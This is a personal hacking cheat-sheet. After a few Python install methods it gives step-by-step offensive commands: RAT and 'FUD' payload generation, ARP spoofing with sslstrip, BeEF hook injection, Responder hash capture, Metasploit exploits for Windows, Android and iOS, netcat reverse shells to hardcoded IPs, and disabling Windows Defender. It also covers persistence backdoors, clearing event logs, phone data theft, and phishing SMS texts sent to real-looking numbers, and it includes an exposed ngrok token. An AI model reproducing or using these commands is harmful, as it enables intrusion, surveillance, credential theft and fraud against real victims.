@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"

    Download and install python using the following command.

choco install -y python3

    You can check the version to verify if Python was successfully installed as follows.

python --version




"method 2"
You can not install it without administrator privileges. It would be lack of security I guess. What you can use in pipelines for instance is:

$url = "https://www.python.org/ftp/python/3.7.6/python-3.7.6-amd64.exe"
$output = "C:/tmp/python-3.7.6-amd64.exe"

if (Test-Path $output) {
    Write-Host "Script exists - skipping installation"
    return;
}

New-Item -ItemType Directory -Force -Path C:/tmp

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $output


& $output /passive InstallAllUsers=1 PrependPath=1 Include_test=0 




"method 3"
You could download the setup you want to install and then install it automatically without using the setup's UI this uses powershell:

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe" -OutFile "c:/temp/python-3.7.0.exe"

c:/temp/python-3.7.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

I don't think it will work without admin privileges though, I tried using InstallAllUsers=0 to install it only for the current user but it is still asking for elevation.



**********************************************************************************
#how to use chaos Framwork fud payload maker

#installation
apt install golang xterm git upx-ucl -y

git clone https://github.com/tiagorlampert/CHAOS.git

sudo apt install golang git -y

*go get github.com/kbinani/screenshot && github.com/lxn/win* "Use This Command the run script"

go get github.com/lxn/win

go get github.com/matishsiao/goInfo

go get golang.org/x/sys/windows

cd ~/go/src/github.com/tiagorlampert/CHAOS


# Run
cd CHAOS

go run main.go  "or"   go run CHAOS.go


#usage


***********************************************************************************************
# how to clone a website with wget

wget -mk https://www.google.com/




*****************************************************************************************************

#how to use rdp " remote desktop "

rdesktop 192.1868.1.123   " -u sets user -p sets pass"


#enable rdp via meterpreter shell "run getgui -h "opens help list"

run getgui -e -u admin -p admin  "run the script with the right user name and password or enter one this script will create a user name and pass for you just enter the info you want to be tthe user and pass"

ex:    getgui -e -u admin -p 12345       "this will turn on rdp and use these passwords you must have a meterpreter shell run these commands in the shell





#########################################################################
how to use ssl strip and arpsoof

echo 1>/proc/sys/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

route -n

nmap -sS -O ,gateway IP>/24

arpspoof -i <eth0> <192.168.1.234> -r <192.168.1.1>

sslstrip -l 8080

cat sslstrip.log    "to see captured data like logins"





###################################################################


#dnschef

dnschef --fakeip=192.168.1.220 --fakedomains=espn.com,google.com --nameservers=8.8.8.8 


dnschef --fakeip=192.168.1.220 --fakedomains=espn.com,google.com --interface 192.168.1.220

********************************************************************************************************
#how to use / login ftp

apt-get install ftp -y

ftp 10.0.0.139

"may need password"


***********************************************f**************************************************************
#how to use ssh

ssh msfadmin@10.0.0.139 22

"may need password"


**************************************************************************************************************
#how to use Telnet

telnet 10.0.0.139

"may need password"


*****************************************************************************************
#upgrade cmd shell to meterpreter

use post/multi/manage/shell_to_metrpreter

set SESSION 1

show options 

exploit

*************************************************************************************
how to man in the middle with netsniff-ng

netsniff-ng -D  "shows dif types of caputres"

netsniff-ng --in eth0 --out dump.pcap -s -T 0xa1b2c3d4 --bind-cpu 0 tcp or udp     "start sniffing"

ctrl C    "to stop attack and see data" 


tcpdump -tttt -r ./dump.pcap   "veiw pcap file and its data"

tcpdump -tttt -r ./dump.pcap |less -S  "make file more readable"

tcpdump -tttt -nn -r ./dump.pcap   "shows just ips and ports and flags"



*********************************************************************************************
how to install mitmf 

apt-get install mitmf -y

"fix erorrs and twisted issues"

apt-get install twisted

apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file

pip uninstall twisted 

pip install twisted==15.5.0

#and method to install mitmf
go to git clone page for more info

git clone https://github.com/byt3bl33d3r/MITMf.git

pip install reqirements.txt

python mitmf.py



************************************************************************************************************************
#how to use mitmf for man in the middle atacks


"inject beef hook"
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.226 --inject --js-url http://192.168.1.212:3000/hook.js


"inject whole lan"
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --inject --js-url http://192.168.1.212:3000/hook.js


"inject a html file"
mitmf --inject --html-file /root/inject.html --spof --arp --gateway 10.0.0.1 -i eth0




*******************************************************************************************************************
#start servers

service apache2 start

php -S 0.0.0.0:80 -c /root/   "the -c can be used to choice what file to host"


python -m SimHTTPServer "run this to host the dir you are currently in"



********************************************************************************
#how to use ngrok 

first sign up at ngroks website and get your auth token

download and unzip ngrok


cd ngrok

./ngrok authtoken <your token> 

./ngrok tcp 443

./ngrok http 80

./ngrok --help


"for mutli tunnels save this in the .ngrok2 file as ngrok.yml file"


authtoken: 442y34JP8fW3L23ANhqQK_6dGp1n7airK5hxAzaZwEY
tunnels:
 first-app:
        addr: 80
        proto: http
 second-app:
        addr: 3000
        proto: http

start the file with    ./ngrok start --all



*************************************************************************************
how to use serveo net https://serveo.net/

Manual
Basic use

    ssh -R 80:localhost:3000 serveo.net

The -R option instructs your SSH client to request port forwarding from the server and proxy requests to the specified host and port (usually localhost). A subdomain of serveo.net will be assigned to forward HTTP traffic.
Request multiple tunnels at once

    ssh -R 80:localhost:3000 -R 80:localhost:9999 serveo.net

The target server doesn't have to be on localhost

     ssh -R 80:example.com:80 serveo.net

Request a particular subdomain

The subdomain is chosen deterministically based on your IP address, the provided SSH username, and subdomain availability, so you'll often get the same subdomain between restarts. You can also request a particular subdomain:

    ssh -R incubo:80:localhost:8888 serveo.net
    ssh -R incubo.serveo.net:80:localhost:8888 serveo.net

Change the SSH username to get assigned a different subdomain:

    ssh -R 80:localhost:8888 foo@serveo.net
    ssh -R 80:localhost:8888 -l foo serveo.net

SSH forwarding

Request forwarding for port 22, and serveo.net will act as a jump host, allowing you to conveniently SSH into your machine (a unique alias is required):

    ssh -R myalias:22:localhost:22 serveo.net

Then you can establish an SSH connection using serveo.net as an intermediary like this:

    ssh -J serveo.net user@myalias

The -J option was introduced in the OpenSSH client version 7.3. If you have an older client, you can use the ProxyCommand option instead:

    ssh -o ProxyCommand="ssh -W myalias:22 serveo.net" user@myalias

Generic TCP forwarding

If you request a port other than 80, 443, or 22, raw TCP traffic will be forwarded. (In this case, there's no way to route connections based on hostname, and the host, if specifed, will be ignored.)

    ssh -R 1492:localhost:1492 serveo.net

If port 0 is requested, a random TCP port will be forwarded:

    ssh -R 0:localhost:1492 serveo.net

Connect on port 443

In some environments, outbound port 22 connections are blocked. For this reason, you can also connect on port 443.

    ssh -p 443 -R 80:localhost:8888 serveo.net

Keep the connection alive

Use ServerAliveInterval to prevent an idle connection from timing out:

    ssh -o ServerAliveInterval=60 -R 80:localhost:8888 serveo.net

Automatically reconnect

Use autossh for more persistent tunnels. Use "-M 0" to disable autossh's connectivity checking (rely on ServerAliveInterval and ServerAliveCountMax instead):

    autossh -M 0 -R 80:localhost:8888 serveo.net

See https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-autossh/ for more about autossh.
GUI

Pressing g will start a GUI session. Use up and down arrow keys to inspect requests/responses, and left and right arrow keys to switch between request and response views. Use j, k, u, d, p, and n to scroll the lower inspector pane. Press r to replay the selected request. Press h or ? at any time for help.
Custom Domain

To use your own domain or subdomain, you'll first need an SSH key pair. Use the ssh-keygen program to generate a key pair if you don't already have one.

Next, use ssh-keygen -l and note your key's fingerprint. Here's an example output:

    2048 SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY no comment (RSA)

In this example, the fingerprint is SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY.

Now you need to add two DNS records for the domain or subdomain you'd like to use:

    An A record pointing to 159.89.214.31.
    For each SSH key to allow, a TXT record in the form of authkeyfp=[fingerprint]. For the example key above, the DNS record would be authkeyfp=SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY.

Once your DNS records are in place, you can request your subdomain/domain from Serveo:

    ssh -R subdomain.example.com:80:localhost:3000 serveo.net

When you request port forwarding for subdomain.example.com, Serveo will fetch the TXT records from your DNS server and only allow forwarding if you've provided a public key with the same fingerprint as specified in TXT records.








********************************************************************************************************************************
#Install Teamviewer


first download teamviewer from thier website


apt-get -f install
apt-get update
apt-get -f install
dpkg --printforegin-architectures
dpkg -add-architectures i3886
dpkg -i teamviewer_13.2.26559_amd64.deb
apt-get -f install
apt-get update
apt-get -f install
dpkg -i teamviewer_13.2.26559_amd64.deb



*************************************************************************************
how to use parat

generate -i 10.0.0.16 -p 443 -o RAT

your malware will be in the parat outpout file




********************************************************************************************************************************************
how to change your mac address using mac changer

macchanger --help         "help list"

macchanger eth0 -s        "shows your current mac addrress"

macchanger eth0 -m        "change mac to a custom mac address if you use the same as a device on a paid wifi you can use that wifi free"

macchanger eth0 -A        "change to a random mac address with vender section encluded use -a vendor of same type"

macchanger eth0 -r        "fully random mac vendor and all"

macchanger eth0 -p        "reset mac address to origanl"

"ito make sure the mac address changed reset the network manager"
a
ifconfig eth0 up                        

service network-manager restart         "restart network manager to change the mac"



***********************************************************************************************************
#How to set up proxychains

apt-get install tor

nano /etc/proxychains.conf

uncomment dynamic chain

uncomment Proxy DNS requests
add tor proxy to prxy list

socks4	127.0.0.1 9050
socks5	127.0.0.1 9050

service tor start 

proxychains msfconsole

proxychains nmap -t4 -A -v 10.0.0.1/24

proxychains firefox www.google.com




***************************************************************************
how to use Nipe to anon your system

cd nipe

    perl nipe.pl install                    "installs nipe"
    perl nipe.pl start                      "starts nipe"
    perl nipe.pl stop                       "stops nipe"
    perl nipe.pl restart                    "restarts nipe"
    perl nipe.pl status                     "status of nipe"


if you get a error run:
sudo cpan install Try::Tiny Config::Simple JSON


*****************************************************************************************************************************
how to get a VPN on linux anon your system

#go to www.vpnbook.com download a vpn certificate

#run it via termainl with the VPN cert name and the command "open vpn"
#use username and pass from openvpn.com the username is vpnbook password is 8AKctYE

to start

openvpn "vpnfilename"

openvpn vpnbook-fr1-udp53.ovpn



*******************************************************************************************************
clone a website with wget

wget -mk www.basicwebsiteexample.com/          "clones the whole site"




***************************************************************************************
how to use empire

listeners

uselistener http

help

info

set Name Payload

set Port 8080

execute

launcher powershell


"after getting a shell"

agents

interact "agents name"

info

help

usemodule


***********************************************************************************
how to use hatkey key logger 

 Command  Description                          
 -------  -----------                          
 exit     Exit the console                     
 list     List all agents                      
 kill     Kill an agent                        
 run      Run Command and Controler            
 help     Help menu                            
 set      Sets a variable to a value           
 show     Show Command and Controler variables 
HatKey > list
 ID  IP  Username 
 --  --  -------- 
HatKey > show
 Name  Current Setting  Required  Description                          
 ----  ---------------  --------  -----------                          
 host                   True      The Command and Controler IP address 
 port  8080             True      The Command and Controler port       
HatKey > set host 10.0.0.15
HatKey > run





***************************************************************************
how to use embedinHTML

python embedInHTML.py  -k data -f '/root/putty.exe' -o fileshare.html


"if mime type fails use -m/--mime"

python embedInHTML.py -m/--mime  -k data -f '/root/encryptedtest.py' -o fileshare.html

python embedInHTML.py -m/--mime  -k data -f '/root/showbox.apk' -o index.html



 " -f is file path"   " -o is output for files name "


*******************************************************************************************************************

#Veil Evasion + Phantom Evasion Custom Payload 

in Veil

use 2

use 4

set BadChars \x00\x0a

set Encoder xor

set LHOST 10.0.0.15

set LPORT 443

generate


"in Phantom"

1

4 or windows paylaod of your choice

2

********************************************************************************************************
#how to use Unicorn
#how to make a fud powershell payload with metasploit hack windows 7,8 and 10 start uncorin by going to its folder and running the program with ./unicon.py then type


./unicorn.py windows/meterpreter/reverse_https 192.168.1.77 443   "generate a fud powershell payload with unicon"


add "hta" at the end of the script to make a web deleivery based attack.



Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>

PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443

PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe

PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro

Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro

Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)
Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)
Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)
Generate .SettingContent-ms: python unicorn.py ms
Help Menu: python unicorn.py --help



**********************************************************************************************************
#how to use responder "to capture admin password hasses and other password very easy""see reposnder rules to get more passwords

responder -help

responder -I eth0 -wv      grab admin username and password from a windows network

responder -I eth0 -b      for basic http "clear text" return

responder -I eth0 -wrFb    for login password grabbing login box on the internet

responder -I eth0 -wvrudfbFP

responder -I eth0 -wvrudbflmFP

hashes are stored in usr/share/responder/logs   

#then use john to crack hashes

to use john type john "file name"

#then use psexe to exploit the device with the username and password you found.

use exploit/windows/smb/psexec

set PAYLOAD windows/meterpreter/reverse_tcp

set SMBUSER 

set SMBPASS

set SMBDOMAIN

set LHOST 10.0.0.16

set RHOST 

set LPORT 443

exploit


***************************************************************************************************************************

how to change mac address

ifconfig wlan0 down

ifconfig wlan0 up

ifconfig wlan0mon0 down

macchange --help

macchanger -r wlan0

macchanger -m 00:11:22:33:44:55

ifconfig wlan0mon0 up

ifconfig wlan0 up


*************************************************************************************************************

harvest e-mails

theharvester

theharvester -d gmail.com -b google -l 100

theharvester -d gmail.com -b all -l 500    "gain emails"


thehavster -d msn.com -b bing -c    "dns brute fouce attack"


theharvester -d cisco.com -b google    "for host name searchers and related info
 


****************************************************************************************
#Beef XXS NOTES

#get meterpreter shell from beef

goto in beef exploits/localhost/javaplayload   "connect back host 10.0.0.15"

use multi/handler

set PAYLOAD java/meterpreter/reverse_tcp

set LHOST 10.0.0.170

set LPORT 6666



#link for social enginering pop up beef 


#Android Shell WLAN http://71.58.122.35:12345/www.%2FPlug+Ins         

#Android metapreter WLANHTTP http://71.58.122.35:12345/www.%2Fapks%2FWLANHTTP

#Android shell LAN http://10.0.0.89:12345/www.%2FUpdatePlugin

#Android Metapreter LANHTTP http://10.0.0.89:12345/www.%2Fapks%2FLANHTTP

#windows shell LAN http://10.0.0.89:12345/www.%2FUpdate

#Windows Shell WLAN http://71.58.122.35:12345/www.%2FYoutubePlugIn

#windows shell payload exe
http://71.58.122.35:12345/www.%2FWindowsupdate


#beef hooks
<script src="http://192.168.1.222:3000/hook.js" type"text/javascript"></script><Script Language='Javascript'>



<script src="http://Public IP Addreess:3000/hook.js" type"text/javascript"></script><Script Language='Javascript'>


<script src="http://10.0.0.225:3000/hook.js" type"text/javascript"></script><script Language='Javascript'></script>


<script src="http://<IP>:3000/hook.js"></script>


"edit Beef File you can add your ip add tools etc"

cd /usr/share/beef-xss 

leafpad config.yaml

cd /usr/share/beef-xss/extensions/metasploit/

leafpad config.yaml


****************************************************************************************************************************************
#metasploit must knows

show targets     "shows targets when in a exploit"

search   "search exploit or android windows anything"

show options     "show settings needed for a exploit"

****************************************************************************
#android exploits for metasploit

use exploit android/broswer/stagefright_mp4_tx3g_64bit

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set ExitOnSession false

set SSL false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

set SRVPORT 8080

exploit -j




use exploit android/broswer/webveiw_addkjavascriptinterface

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set Retries true

set ExitOnSession false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

set SRVPORT 8080

exploit -j




use exploit android/broswer/samsung_knox_smdm_url

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set APK_VERSION 1337

set Retries true

set ExitOnSession false

set SRVPORT 8080

set SRVHOST 0.0.0.0

exploit -j







use exploit/android/adb/adb_server_exec

set PAYLOAD generic/shell_bind_tcp

set LHOST 10.0.0.170

set LPORT 4444

set WritableDir /data/local/tmp/

set RPORT 8889

set SRVPORT 8080

set SRVHOST 0.0.0.0

set RHOST 10.0.0.89

exploit


#LOCAL

use exploit/android/local/put_user_vroot
msf exploit(put_user_vroot) > set TARGET 0
TARGET => 0
msf exploit(put_user_vroot) > set PAYLOAD generic/shell_reverse_tcp
PAYLOAD => generic/shell_reverse_tcp
msf exploit(put_user_vroot) > set LHOST 10.0.0.170
LHOST => 10.0.0.170
msf exploit(put_user_vroot) > set LPORT 4444
LPORT => 27042
msf exploit(put_user_vroot) > set ExitOnSession false
ExitOnSession => false
msf exploit(put_user_vroot) > set DisablePayloadHandler false
DisablePayloadHandler => false
msf exploit(put_user_vroot) > exploit -j

set RHOST 10.0.0.89
#PDF

use exploit/android/fileformat/adobe_reader_pdf_js_interface

 set TARGET 0

msf exploit(adobe_reader_pdf_js_interface) > set PAYLOAD generic/shell_reverse_tcp

msf exploit(adobe_reader_pdf_js_interface) > set LHOST 10.0.0.170

msf exploit(adobe_reader_pdf_js_interface) > set LPORT 8889

msf exploit(adobe_reader_pdf_js_interface) > 


msf exploit(adobe_reader_pdf_js_interface) > set PDF::Obfuscate true

msf exploit(adobe_reader_pdf_js_interface) > set ExitOnSession false

msf exploit(adobe_reader_pdf_js_interface) > set PDF::Method DOCUMENT

msf exploit(adobe_reader_pdf_js_interface) > set FILENAME Doller General.pdf

msf exploit(adobe_reader_pdf_js_interface) > set PDF::Encoder ASCIIHEX

msf exploit(adobe_reader_pdf_js_interface) > set DisablePayloadHandler false

set RHOST 10.0.0.89

msf exploit(adobe_reader_pdf_js_interface) > exploit -j



#LOCAL

use exploit/android/local/futex_requeue
msf exploit(futex_requeue) > set TARGET 0
TARGET => 0
msf exploit(futex_requeue) > set PAYLOAD generic/shell_reverse_tcp
PAYLOAD => generic/shell_reverse_tcp
msf exploit(futex_requeue) > set LHOST 10.0.0.170
LHOST => 10.0.0.170
msf exploit(futex_requeue) > set LPORT 26836
LPORT => 26836
msf exploit(futex_requeue) > set ExitOnSession false
ExitOnSession => false
msf exploit(futex_requeue) > set DisablePayloadHandler false
DisablePayloadHandler => false

set RHOST 10.0.0.89

msf exploit(futex_requeue) > exploit -j



**************************************************************************************
#START Ecoded HANDLER / options
1. Handler
msf> use multi/handler

2. set payload
msf exploit(handler) > set PAYLOAD android/meterpreter/reverse_tcp

3. Set local port
msf exploit(handler) > set LPORT 4444

4. Set local host
msf exploit(handler) > set LHOST 10.0.0.170

set ECODING 

set EXITONSESSION false

set LITERATIONS 15


5. 
msf exploit(handler) > exploit

*********************************************************************************
#IPHONE HACK BROWSER EXPLOIT ATTACK


use exploit/apple_ios/browser/safari_libtiff

set TARGET 0

"you can use multi playoads with this explit as with many msf exploits and remote access files from msfvnom"

set PAYLOAD apple_ios/aarch64/meterpreter/reverse_tcp

set PAYLOAD osx/x86/vforkshell/reverse_tcp

set PAYLOAD oxs/armle/execute/reversetcp

set LHOST 10.0.0.170

set LPORT 4444

set ExitOnSession false

set SRVPORT 8080

set SSL false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

exploit -j


********************************************************************************

#netcat notes
netcat  "command live version


nc     "nmap version"

nc -h   "list all commands"


port scan     -zvn 10.0.0.30 1-1000

                                          "IP Address and PORT"
connect to open ports          netcat -vn 10.0.0.30 445     


spawn a server on a port on windows      ncat -nlvp 8080 -e cmd.exe


connect directly to spawned a server from linux   nc -nv "IP Adress" 8080


connect with reverse shell to spawned server from linux  nc "IP Adrress" 8080 -e /bin/bash

                               netcat
spawn server to send file      ncat -nlvp 8080 > "filename.exe"


                               netcat
send file to spwaned server    ncat "IP Address" 8080 < "filename.exe"

spawn a linux server      "netcat -lvp 1122 -e /bin/sh

connect to spwaned linux server nc -nc 10.0.0.89 1122 -e /bin/sh

make linux lister for reverse shell    nc -nvlp 443

connect with windows to reverse shell to linux   ncat -nv 10.0.0.170 443 -e cmd.exe



#NOTE can be used with port forwarding

*********************************************************************************************************************************************************************************************************************************


#COMMAD PROMPT SHELL COMMANDS

"Press"
F1 , F2 , F3 ,F5  "paste last executed command in diffrent ways"

F7  , F8  " shows past exe commands"



attrib +h/s/d       "hide all files within a folder"

ncat or Netcat or nc  "checks for netcat"

dir    "displays a list of a folder files and subfiles"

attrib     Changes files read write hidden status"

tasklist

tasklist/APPS       "see all programs and or process running"

get-process

taskkill /PID 5812 /F   "kill a task use proper pid"

bootcfg   "motify boot file"

cd     "show current dir"

copy    "copy a file"

del   "delete a file"

RmDir    or RMDIR /S  "delete a dir"

echo  "used to show a message"

move   "move a file

start    "start a application  or new command window"

systeminfo   "get sys info"

hostname   "shows pc name"

logoff  "log user off"

shutdown    "shutdown pc

shutdown -r   "restart pc"

shutdown -i "brings up prompt"

telnet

arp -a    "get a ip interface list of the network pc, subnet, etc"

arp /a   "gain subnetmask and lan ip data"

ipconfig

ping       "you can use ping to find other host on the network"

tracert     "trace route

tracerpt

net

netsh

netstat

route  "change routing tables"

sc stop WinDefend    "stop windows defender"

sc start WinDefend    "start windows denfender"


sc config WinDefend start= disable      "stop windows defender"
sc start WinDefend


sc config WinDefend auto=                "start windows denfender"
sc stop WinDefend


powercfg   "manager power setting like sleep"

type  "shows contents of a text file

edit   "edit a txt file"

tree   "graphicaly displays dir stucture of a folder or drive"

deltree   "delete a whole dir EVERYTHING"

net user    "to see all users on pc and thier hostnames"


netsh wlan show profiles             "see all wifi pc ever connected too "must be admin"


netsh wlan show profile "enter a ssid" key=clear           "to see info and password in clear text of that network" 

net user "nameof user /delete    "to delete user"

net user bob password /add  "to add user with the name of bob and password of password

net localgroup administrators bob /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"


whoami    "to see your user id and pc hostname"

tasklist   "see all running tasks on the pc"

taskkill -pid  "process id"   or taskkill -im iexplore.exe     "to kill a ytask ot program"




start firefox http://10.0.0.15:3000/demos/butcher.index     "start a beef hooked page lan"


start firefox http://71.58.122.35:3000/demos/butcher.index     "start a beef hooked page wlan"





"if they have netcat"

ncat -nv 10.0.0.15 7878 -e cmd.exe       "start a lan reverse shell"

ncat -nv 71.58.122.35 7777 -e cmd.exe     "start a wlan reverse shell"


#TRUNING OFF WINDOWS Defenses


#disable windows firewall

netsh advfirewall set currentprofile off




TURN OFF WINDOWS DEFENDER

"run in powershell as admin lvl" 

Set-MpPreference-DisableRealTimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true

"C:\Programs files\windows defender\mpcmdrub.exe" -RemoveDefintions -All Set-MpPreference -DisableIOAVProtection $true


"then add path enclsion to keep it contained"

windows powershell

"Add-MpPreference -ExclusionPath "C:\"


if fails try not using power shell to add path enclusion.



**************************************************************************************************************************************************************
download files using powershell


(New-Objext System.Net.WebClient).DownloadFile("http://192.168.1.212/payload.exe", "C:\Windows\Temp\payload.exe")

start filename.exe





**************************************************************************************************************************************************************************
#METERPRETER COMMANDS

arp

cat "and the file name to see file contents" 

info

read

shutdown 

reboot

irb

edit

machine_id 

load sound

load incognito

resource

"open old shell that has backdoor "exploit -j -z"

route                    "shows all network device is connected to"

getsystem

wake

bgrun 

bglist

bgkill

sleep

hide_app_icon

wakelock

help

sessions

sessions -i

shell

host

checksum

cp

rm

mv

id

cd

cd /

cd..

ls

cd storage

ls

cd extSdCard

ls

dir

del         rm

edit

mkdir

rmdir

download     download -r

upload       

lcd

getlwd

gettwd

pwd

cat

run

reg

timestomp

bglist

channel

interact

transport

read

run kill.rb

serach -f*.mp4     serach -d . -f *.txt

sysinfo

ipconfig

ifconfig

ping        ping 10.0.0.1      ping 192.168.0.1

netstat      netstat -a    netstat -ano | grep LISTEN

lsod -nPi

portfwd     

check

ps

getuid

execute 

activity_start

sqlie_query

sqlite_query -d /data/data/com.android.browser/databases/webviewCookiesChromium.db -q 'SELECT * from cookies'

localtime i

set_audio_mode

wakelock     'Enable/Disable Wakelock'

interval_collect   "example"   interval_collect -c geo -d 15 -a start     interval_collect -c geo -a stop   " to collect geo loaction data over time"

dump_sms     

dump_calllog

dump_contacts

localtime 

geolocate

lan_geolocate

wlan_geolocate

activity_start tel:12323333

activity_start content://contacts/people/1

send_sms

send_sms -d +918386866885  -t "hacked" 

send_sms -d +17173798497 -t "check out this cool app it has a bunch of new free movies and tv shows and links to websites that host movies and ITS FREE no more netflix heres the apps website to download it youre welcome ;) http:///www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html"

send_sms -d +918386866885 -t check out this awesome free movie app and site I found just download the app it has every movie and tv show ever for FREE you can download it here https://grabify.link/QEYB9F

webcam_list

webcam_snap -i 2      webcam_snap -| 2      webcam_snap 2      

webcam_snap

webcam_stream -i 2        webcam_stream -i 2       webcam_stream -|2

webcam_chat

cd stroage

record_mic -d 30        record_mic

screenshot

hashdump

check root

execute

getprivs

reboot

device_shutdown     shutdown

rev2self

idletime

keyscan_start

keyscan_dump

keyscan_stop

uictl

exit

backgroud

getpid

load powershell    "to load the powershell extion an enable powershell commands"

ps "to check process"  migrate "ppid of lsass"  "to make the shell stronger and less dectactable  migrate to process lsass.exe or explorer.exe"

run persistence -h                      "get help list"

run persistence -X     "sends a shell signal at pcs boot up set listner to port 4444"

run persistence -p 4444 -r 10.0.0.170

run persistence -A

run persistence -U -i 5 -p 443 -r 10.0.0.15

run persistence -X -i 5 -p 443 -r 10.0.0.15

run persistence -S -i 5 -p 443 -r 10.0.0.15

run persistence -h              

run persistence -A -L c:\\ -X 30 -p  443 -r "target ip address"

run metsvc      "to install a back door take note of what port backdoor uses"

run metsvc -A   "auto start backdoor"

run vnc        "run vnc to see live screen stream"


portfwd add -| 4444 -p 4444 -r target


#how to pivot   "background the session you want to pivot from with ctrl Z then type"

route add "target ip to route to" 255.255.255.255.0 "then type session ID to pivot from" then use exploit to hack targeted device

use exploit/windows/smb/ms08_067_netapi     set RHOST "traget ip"


clearev        "CLEAR YOUR TRACKS DONT GET CAUGHT this clears the event log"

load mimikatz    "load mimikatz commands"

load kiwi    "load  kiwi commands"

*********************************************************************
#multihandler options

#android

use mutli/handler

set AndroidHideAppIcon true

set AutoSystemInfo true

set AutoUnhookProcess true

(all Options)
  AndroidHideAppIcon R -o
  AndroidHideAppIcon           false
  AndroidMeterpreterDebug      false
  AndroidWakelock              true
  AutoLoadStdapi               true
  AutoRunScript                
  AutoSystemInfo               true
  AutoUnhookProcess            false
  AutoVerifySession            true
  AutoVerifySessionTimeout     30
  ContextInformationFile       
  DisablePayloadHandler        false
  EnableContextEncoding        true
  EnableEncodedStager          true
  EnableStageEncoding          false
  EnableUnicodeEncoding        false
  Encoding                     x86/shikata_ga_nai
  ExitOnSession                true         HandlerSSLCert                                          
  InitialAutoRunScript         
  Iterations                   15
  LHOST                        192.168.1.220
  LPORT                        443
  ListenerTimeout              0
  PAYLOAD                      android/meterpreter/reverse_tcp
  PayloadProcessCommandLine    
  PayloadUUIDName              
  PayloadUUIDRaw               
  PayloadUUIDSeed              
  PayloadUUIDTracking          false
  ReverseAllowProxy            false
  ReverseListenerBindAddress   
  ReverseListenerBindPort      
  ReverseListenerComm          
  ReverseListenerThreaded      false
  SessionCommunicationTimeout  300
  SessionExpirationTimeout     604800
  SessionRetryTotal            3600
  SessionRetryWait             10
  StageEncoder                 
  StageEncoderSaveRegisters    
  StageEncodingFallback        true
  StagerRetryCount             10
  StagerRetryWait              5
  VERBOSE                      false
  WORKSPACE                    
  WfsDelay

*****************************************
*******************************************************************************************
#windows cmd commads 

type    "see inside a file"


cd C:\      "goto c drive"


ipconfig   "get network info for that pc"


systeminfo    "shows all sys info"


netsh wlan show profiles     "shows saved wifis"


netsh wlan show profile "profile name" key=clear     "see wifi info with password in clear text"


shutdown -r     "restart the pc"


arp -a       "get saved privte ip address on the network of the hacked pc"


netstat -a                 "see all active connections"


whoami         "see what user you are"


net user      "get user info"


start      "start a program use program name after start"

start firefox      "start firefox add a url to open to that website"

start firefox http://192.168.1.11:3000/demos/basic.html     "start firefox broswer to beefs demo page run beef to handler the connection"


#create new user with cmd shell "for prestance or psexec exploit"

net user "bob" password /add  "to create account with the name of bob password pass

net localgroup administrators "bob" /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"


shell net user admin     "repace admin with username to see if current user is in a stsyem admin group"



#Trun Off Windows Defender
#command to disable win defender on cmd and reset the defientions to defaults!

"C:\program files\windows defender\mpcmdrun.exe" -RemoveDefintions -All Set-MpPreference -DisableIOAVProtection $true





